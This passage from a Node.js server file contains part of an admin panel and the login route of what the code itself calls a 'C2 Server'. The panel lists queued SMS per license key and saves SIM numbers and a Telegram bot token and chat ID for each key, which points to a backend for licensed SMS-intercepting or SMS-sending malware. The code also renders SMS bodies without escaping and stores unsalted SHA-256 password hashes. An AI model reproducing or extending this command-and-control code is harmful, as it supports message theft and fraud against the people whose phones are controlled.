    return q.length?q.map(s=>'<tr><td class="mono">'+k.licenseKey+'</td><td>'+s.sender+'</td><td>'+s.body+'</td><td style="color:#888;font-size:12px">'+new Date(s.timestamp).toLocaleString()+'</td><td>'+(s.delivered?'<span class="badge badge-active">Sent</span>':'<span class="badge badge-unused">Pending</span>')+'</td></tr>').join(''):'';
  }).join('')||'<tr><td colspan="5" class="empty-row">No queued SMS</td></tr>';
}

// === SIM ===
async function saveSim(){
  const k=document.getElementById('simKey').value.trim()||'PINTU';
  const d=await api('POST','/api/admin/set-sim',{
    licenseKey:k,
    sim1Provider:document.getElementById('sim1Provider').value.trim(),
    sim1Number:document.getElementById('sim1Number').value.trim(),
    sim2Provider:document.getElementById('sim2Provider').value.trim(),
    sim2Number:document.getElementById('sim2Number').value.trim(),
  });
  if(d.success) showToast('SIM settings saved for '+k,'success');
  else showToast(d.error,'error');
}

// === TELEGRAM ===
async function saveTelegram(){
  const k=document.getElementById('tgKey').value.trim()||'PINTU';
  const d=await api('POST','/api/admin/set-telegram',{
    licenseKey:k,
    botToken:document.getElementById('tgBotToken').value.trim(),
    chatId:document.getElementById('tgChatId').value.trim(),
  });
  if(d.success) showToast('Telegram config saved for '+k,'success');
  else showToast(d.error,'error');
}
</script>
</body>
</html>`;

app.all("/", (req, res) => {
  var t="",e="";
  if (req.method==="POST") {
    var u=req.body?.username, p=req.body?.password;
    var user=u&&store._data.users[u];
    if (user&&user.password===crypto.createHash("sha256").update(p||"").digest("hex"))
      t=jwtSign({username:u,role:user.role});
    else
      e="Invalid credentials";
  }
  res.type("html").send(ADMIN_HTML.split("__TOKEN__").join(t).split("__ERROR__").join(e));
});

app.listen(PORT, "0.0.0.0", () => console.log("C2 Server on port "+PORT));
